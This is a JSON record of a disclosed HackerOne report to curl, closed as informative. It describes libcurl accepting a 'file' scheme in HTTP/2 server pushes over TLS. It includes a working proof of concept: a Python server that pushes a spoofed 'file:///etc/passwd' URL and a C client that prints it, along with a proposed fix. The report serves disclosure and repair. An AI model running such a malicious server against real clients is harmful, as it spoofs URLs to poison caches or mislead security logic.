@@ -1,0 +1,148 @@
+{
+  "id": 3674275,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjc0Mjc1",
+  "url": "https://hackerone.com/reports/3674275",
+  "title": "lib/http2.c: SSL connections accept non-HTTP push schemes (incomplete fix for 2e8c922a)",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2026-04-15T06:22:35.158Z",
+  "submitted_at": "2026-04-15T06:22:35.639Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hybirdss",
+    "url": "/hybirdss",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-16T07:02:57.121Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-04-16T06:03:34.752Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`set_transfer_url()` in `lib/http2.c` validates the `:scheme` pseudo-header\nof PUSH_PROMISE frames only when `!via_ssl_conn` — a guard added by commit\n`2e8c922a` to block non-TLS connections from accepting TLS-scheme pushes.\nThe symmetric case was not addressed: over TLS, `via_ssl_conn` is TRUE, the\nguard at line 735 is skipped, and `curl_url_set(u, CURLUPART_SCHEME, v, 0)`\nis called at line 743 with whatever scheme the server supplied.\nIn default builds (`CURL_DISABLE_FILE=OFF`), `Curl_get_scheme(\"file\")` returns\na valid scheme with a non-NULL `run` pointer, so `curl_url_set` returns\n`CURLUE_OK` and the push handle URL becomes `file:///etc/passwd`.\nThe server does not gain local file read — pushed data comes from the H2\nstream — but `CURLINFO_EFFECTIVE_URL` returns `\"file:///etc/passwd\"` and the\ntransfer completes `result=0`, confirmed on libcurl/8.19.0 nghttp2/1.68.1.\nApplications using `CURLMOPT_PUSHFUNCTION` that key caches or routing on\nthe effective URL process server-delivered content under a spoofed `file://`\nlabel; the official `CURLMOPT_PUSHFUNCTION.md` (line 117) example validates\nonly `:path`, making it directly exploitable.\n\n## Affected version\ncurl 8.19.0 (x86_64-pc-linux-gnu) libcurl/8.19.0 OpenSSL/3.6.1\nzlib/1.3.1.zlib-ng nghttp2/1.68.1 (Arch Linux x86_64)\nIntroduced by: commit 2e8c922a (2026-03-27)\n\n## Steps To Reproduce:\nDeps: python3, pip install h2, gcc, libcurl-dev with nghttp2 (default build).\n\n1. Generate TLS cert:\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \\\n  -days 1 -nodes -subj \"/CN=localhost\" \\\n  -addext \"subjectAltName=IP:127.0.0.1\" \\\n  -addext \"basicConstraints=CA:true\"\n\n2. Save server.py and run: python3 server.py cert.pem key.pem 18443 &\n\nimport sys, ssl, socket, threading\nimport h2.connection, h2.config, h2.events\nCERT, KEY, PORT = sys.argv[1], sys.argv[2], int(sys.argv[3])\ndef handle(sock):\n    conn = h2.connection.H2Connection(\n        config=h2.config.H2Configuration(client_side=False, header_encoding='utf-8'))\n    conn.initiate_connection(); conn.receive_data(b'')\n    pushed = False; client_id = None\n    while True:\n        data = sock.recv(65535)\n        if not data: break\n        for ev in conn.receive_data(data):\n            if isinstance(ev, h2.events.RequestReceived): client_id = ev.stream_id\n            elif isinstance(ev, h2.events.StreamEnded) and not pushed:\n                pushed = True\n                conn.push_stream(client_id, 2, [(':method','GET'),(':scheme','file'),\n                    (':path','/etc/passwd'),(':authority',f'127.0.0.1:{PORT}')])\n                conn.send_headers(2,[(':status','200')])\n                conn.send_data(2,b'injected',end_stream=True)\n                conn.send_headers(client_id,[(':status','200')])\n                conn.send_data(client_id,b'ok',end_stream=True)\n        d = conn.data_to_send(65535)\n        if d: sock.sendall(d)\n    sock.close()\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.load_cert_chain(CERT,KEY); ctx.set_alpn_protocols(['h2'])\nwith socket.socket() as s:\n    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n    s.bind(('127.0.0.1',PORT)); s.listen(5); print('READY',flush=True)\n    while True:\n        c,_ = s.accept()\n        threading.Thread(target=lambda c=c: (lambda t: handle(t))(ctx.wrap_socket(c,server_side=True)),daemon=True).start()\n\n3. Save client.c and compile: gcc -o client client.c $(pkg-config --cflags --libs libcurl)\n\n#include <stdio.h>\n#include <curl/curl.h>\nstatic size_t noop(char*p,size_t s,size_t n,void*u){return s*n;}\nstatic int push_cb(CURL*p,CURL*c,size_t n,struct curl_pushheaders*h,void*u){\n  char*url=NULL; curl_easy_getinfo(c,CURLINFO_EFFECTIVE_URL,&url);\n  fprintf(stderr,\"PUSH URL: %s\\n\",url?url:\"null\");\n  curl_easy_setopt(c,CURLOPT_WRITEFUNCTION,noop); return CURL_PUSH_OK;}\nint main(int ac,char**av){\n  CURLM*m=curl_multi_init(); CURL*e=curl_easy_init();\n  curl_easy_setopt(e,CURLOPT_URL,av[1]);\n  curl_easy_setopt(e,CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_2_0);\n  curl_easy_setopt(e,CURLOPT_CAINFO,av[2]);\n  curl_easy_setopt(e,CURLOPT_WRITEFUNCTION,noop);\n  curl_multi_setopt(m,CURLMOPT_PUSHFUNCTION,push_cb);\n  curl_multi_add_handle(m,e);\n  int r=1; while(r>0){curl_multi_perform(m,&r);if(r)curl_multi_poll(m,0,0,500,0);}\n  return 0;}\n\n4. Run: ./client https://127.0.0.1:18443/ cert.pem\n\nConfirmed output (libcurl/8.19.0, result=0):\nPUSH URL: file:///etc/passwd\n\n## Impact\n\n## Summary:\nAn HTTPS server can inject any non-HTTP scheme into a pushed resource's\neffective URL. Applications using CURLMOPT_PUSHFUNCTION receive\nCURLINFO_EFFECTIVE_URL = \"file:///etc/passwd\" for server-delivered content.\nThe server does not read local files — data comes from the H2 push stream —\nbut downstream application code that keys response caches, routing decisions,\nor audit logs on the effective URL processes server-crafted content under a\nspoofed file:// label (cache poisoning, scheme-based security logic bypass,\nmisleading audit logs). Preconditions: application sets CURLMOPT_PUSHFUNCTION\n(non-default) and callback accepts the push.\n\nSuggested fix: in set_transfer_url(), add a symmetric check for via_ssl_conn=TRUE\nthat only permits \"http\" and \"https\" schemes, mirroring the existing non-SSL\nguard at line 735:\n\n  if(via_ssl_conn) {\n    if(!curl_strequal(v, \"https\") && !curl_strequal(v, \"http\")) {\n      rc = 1; goto fail;\n    }\n  }\n  else {\n    const struct Curl_scheme *scheme = Curl_get_scheme(v);\n    if(!scheme || (scheme->flags & PROTOPT_SSL)) {\n      rc = 1; goto fail;\n    }\n  }",
+  "weakness": {
+    "id": 184,
+    "name": "Authentication Bypass by Primary Weakness"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5736613,
+      "file_name": "repro.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cw7qpcqre9s0p3rrb0sq1qqobdsc?response-content-disposition=attachment%3B%20filename%3D%22repro.sh%22%3B%20filename%2A%3DUTF-8%27%27repro.sh&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWCREIVXB%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162137Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEdvPePbfaWbg9GApII7kroalivZUoz%2B3%2FECWiAaLIvzAiBGrxNNo6kBYT%2Fdp3teXzRGe9e%2BJzOifStmsxgRhD3M%2BiqxBQg%2FEAMaDDAxMzYxOTI3NDg0OSIMU9nmDBKw%2FxuuXov%2BKo4FMHblGWNTAIckfC7GcX33ydLGAr%2B7FiZa1kOwx3hTqWCpIh4V2mceTRYBw1nJICgjAYiWklP8JyQXDAxTKMF3oYbSzLbk%2FBVik9u%2B9E%2FF5JVHQbN%2B3ExTUj3b5eOB5xOuZTEQQFPMbR5psPWpEjIKlkosLhTFw4DcBAXYQ3EpWo4gNxXNIWiOdmRqplgfmii5nuVYdQNgWCbLncooOjB6BpD%2BUOGt0pyS6lq38IvPXFGlF0Xucq3ATSo89jB97X1h3QrYuaoBODSC5JpHHAZUQu2xEhtj9%2Bfk2ZC%2BvfasAsehIX767HFstB4vD%2FltkHF7qbKqbY0x1ZqBe2g13N2sHptoOqWJhnrfdWUH1FAqIZUCpIXh%2B%2BrkF33NaoHchwbP%2Fsbc7muzklk3khS5qGTfBHNNnAO%2FSzBlz60NuLmGGZ6BeAYWv%2FhrUaRSsYmc6vI%2BvRAQp8svg4gcjxD8XOarZvqJJUi8UqWEV7cHQd40fFl7RRVtJvr7EFZoHOGZOpRJnnP2c2zyLQykGxgepFVO0IOBTdUVaiDhMsKFMY4DY5uxG1GEEgopzOI2Jg8koMfh2lHgo2Ty%2FojzO%2FM2ahx3CAGfAlfDwODfPW7%2B9VKCkYOnGKTTSPLSpCulN625JfCbU02YWZ77IJTgsF1ajB8BzPnPYm%2BSQ%2B8CKWAHK997UXCs7YyXCYjfBApnvlU0nBIXBnSL1j8ayrkvcmyR3VI7i9qzm5Vx%2F44T%2BYrrsSrPTyrKP3SZ4FslxGTlgfbtLH%2Ffaw71CvuYJ%2BEshY0izII3NLZ9nRD5u8wvN%2BZddgTcIU9yTKvNTeCvnWMNii%2Bsoz%2BqI5H8P2kgS5Xb2ETPaLJAtMMtE%2F9%2BcvclpvC94XxbMLGA2M8GOrIB9rzxSafD28yFyQBvjnugEFFPZMADXhtgZq7SbsJ%2F5%2FZk6kbC0342HwEmETFadpjR%2Biy%2FKsIRTGI1kyBM0w91l1b%2FjtUU5wQXQDdlV%2F4AxwIig8%2BQBFF5isZT1FwPiOZeeUnwgp%2FOsDL1c8WOVl7Y3OLefvqgJ8wDwWwA3ZaSWtH5r628MtX5bgrYV4heoaV2jmadHtyyJuj3k0yYnXy6WMYqVrFrkKlqlz1L0uxfrEz89w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58b5c6b38deaf173341976b72a31ca711a251e840b859ba0ff673df6e149e65e",
+      "file_size": 3908,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 5736614,
+      "file_name": "f02-client.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tic4b2dc5om5yxwvktgm5bmty0s2?response-content-disposition=attachment%3B%20filename%3D%22f02-client.c%22%3B%20filename%2A%3DUTF-8%27%27f02-client.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWCREIVXB%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162137Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEdvPePbfaWbg9GApII7kroalivZUoz%2B3%2FECWiAaLIvzAiBGrxNNo6kBYT%2Fdp3teXzRGe9e%2BJzOifStmsxgRhD3M%2BiqxBQg%2FEAMaDDAxMzYxOTI3NDg0OSIMU9nmDBKw%2FxuuXov%2BKo4FMHblGWNTAIckfC7GcX33ydLGAr%2B7FiZa1kOwx3hTqWCpIh4V2mceTRYBw1nJICgjAYiWklP8JyQXDAxTKMF3oYbSzLbk%2FBVik9u%2B9E%2FF5JVHQbN%2B3ExTUj3b5eOB5xOuZTEQQFPMbR5psPWpEjIKlkosLhTFw4DcBAXYQ3EpWo4gNxXNIWiOdmRqplgfmii5nuVYdQNgWCbLncooOjB6BpD%2BUOGt0pyS6lq38IvPXFGlF0Xucq3ATSo89jB97X1h3QrYuaoBODSC5JpHHAZUQu2xEhtj9%2Bfk2ZC%2BvfasAsehIX767HFstB4vD%2FltkHF7qbKqbY0x1ZqBe2g13N2sHptoOqWJhnrfdWUH1FAqIZUCpIXh%2B%2BrkF33NaoHchwbP%2Fsbc7muzklk3khS5qGTfBHNNnAO%2FSzBlz60NuLmGGZ6BeAYWv%2FhrUaRSsYmc6vI%2BvRAQp8svg4gcjxD8XOarZvqJJUi8UqWEV7cHQd40fFl7RRVtJvr7EFZoHOGZOpRJnnP2c2zyLQykGxgepFVO0IOBTdUVaiDhMsKFMY4DY5uxG1GEEgopzOI2Jg8koMfh2lHgo2Ty%2FojzO%2FM2ahx3CAGfAlfDwODfPW7%2B9VKCkYOnGKTTSPLSpCulN625JfCbU02YWZ77IJTgsF1ajB8BzPnPYm%2BSQ%2B8CKWAHK997UXCs7YyXCYjfBApnvlU0nBIXBnSL1j8ayrkvcmyR3VI7i9qzm5Vx%2F44T%2BYrrsSrPTyrKP3SZ4FslxGTlgfbtLH%2Ffaw71CvuYJ%2BEshY0izII3NLZ9nRD5u8wvN%2BZddgTcIU9yTKvNTeCvnWMNii%2Bsoz%2BqI5H8P2kgS5Xb2ETPaLJAtMMtE%2F9%2BcvclpvC94XxbMLGA2M8GOrIB9rzxSafD28yFyQBvjnugEFFPZMADXhtgZq7SbsJ%2F5%2FZk6kbC0342HwEmETFadpjR%2Biy%2FKsIRTGI1kyBM0w91l1b%2FjtUU5wQXQDdlV%2F4AxwIig8%2BQBFF5isZT1FwPiOZeeUnwgp%2FOsDL1c8WOVl7Y3OLefvqgJ8wDwWwA3ZaSWtH5r628MtX5bgrYV4heoaV2jmadHtyyJuj3k0yYnXy6WMYqVrFrkKlqlz1L0uxfrEz89w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13fda07cb4ba31caded5d323c7655cc09495f3433838c806fe3eb2c334891ebd",
+      "file_size": 5255,
+      "type": "text/x-csrc",
+      "moderated": null
+    },
+    {
+      "id": 5736615,
+      "file_name": "f02-server-repro.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bw94y0a4m9f60xdn1alfwpg9ymr3?response-content-disposition=attachment%3B%20filename%3D%22f02-server-repro.py%22%3B%20filename%2A%3DUTF-8%27%27f02-server-repro.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWCREIVXB%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162137Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEdvPePbfaWbg9GApII7kroalivZUoz%2B3%2FECWiAaLIvzAiBGrxNNo6kBYT%2Fdp3teXzRGe9e%2BJzOifStmsxgRhD3M%2BiqxBQg%2FEAMaDDAxMzYxOTI3NDg0OSIMU9nmDBKw%2FxuuXov%2BKo4FMHblGWNTAIckfC7GcX33ydLGAr%2B7FiZa1kOwx3hTqWCpIh4V2mceTRYBw1nJICgjAYiWklP8JyQXDAxTKMF3oYbSzLbk%2FBVik9u%2B9E%2FF5JVHQbN%2B3ExTUj3b5eOB5xOuZTEQQFPMbR5psPWpEjIKlkosLhTFw4DcBAXYQ3EpWo4gNxXNIWiOdmRqplgfmii5nuVYdQNgWCbLncooOjB6BpD%2BUOGt0pyS6lq38IvPXFGlF0Xucq3ATSo89jB97X1h3QrYuaoBODSC5JpHHAZUQu2xEhtj9%2Bfk2ZC%2BvfasAsehIX767HFstB4vD%2FltkHF7qbKqbY0x1ZqBe2g13N2sHptoOqWJhnrfdWUH1FAqIZUCpIXh%2B%2BrkF33NaoHchwbP%2Fsbc7muzklk3khS5qGTfBHNNnAO%2FSzBlz60NuLmGGZ6BeAYWv%2FhrUaRSsYmc6vI%2BvRAQp8svg4gcjxD8XOarZvqJJUi8UqWEV7cHQd40fFl7RRVtJvr7EFZoHOGZOpRJnnP2c2zyLQykGxgepFVO0IOBTdUVaiDhMsKFMY4DY5uxG1GEEgopzOI2Jg8koMfh2lHgo2Ty%2FojzO%2FM2ahx3CAGfAlfDwODfPW7%2B9VKCkYOnGKTTSPLSpCulN625JfCbU02YWZ77IJTgsF1ajB8BzPnPYm%2BSQ%2B8CKWAHK997UXCs7YyXCYjfBApnvlU0nBIXBnSL1j8ayrkvcmyR3VI7i9qzm5Vx%2F44T%2BYrrsSrPTyrKP3SZ4FslxGTlgfbtLH%2Ffaw71CvuYJ%2BEshY0izII3NLZ9nRD5u8wvN%2BZddgTcIU9yTKvNTeCvnWMNii%2Bsoz%2BqI5H8P2kgS5Xb2ETPaLJAtMMtE%2F9%2BcvclpvC94XxbMLGA2M8GOrIB9rzxSafD28yFyQBvjnugEFFPZMADXhtgZq7SbsJ%2F5%2FZk6kbC0342HwEmETFadpjR%2Biy%2FKsIRTGI1kyBM0w91l1b%2FjtUU5wQXQDdlV%2F4AxwIig8%2BQBFF5isZT1FwPiOZeeUnwgp%2FOsDL1c8WOVl7Y3OLefvqgJ8wDwWwA3ZaSWtH5r628MtX5bgrYV4heoaV2jmadHtyyJuj3k0yYnXy6WMYqVrFrkKlqlz1L0uxfrEz89w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4e1a4e09f47b0ce8eb296e3b82618572013ca9d700307a1f20400e1dda9a3a8d",
+      "file_size": 2512,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 28,
+  "voters": [
+    "mchelesanto",
+    "trptt",
+    "2026",
+    "nwicks",
+    "sn0xsharma",
+    "swaley",
+    "red_blue_lilith",
+    "mohamski",
+    "r6rosinaldonevesr6",
+    "01data-ai",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
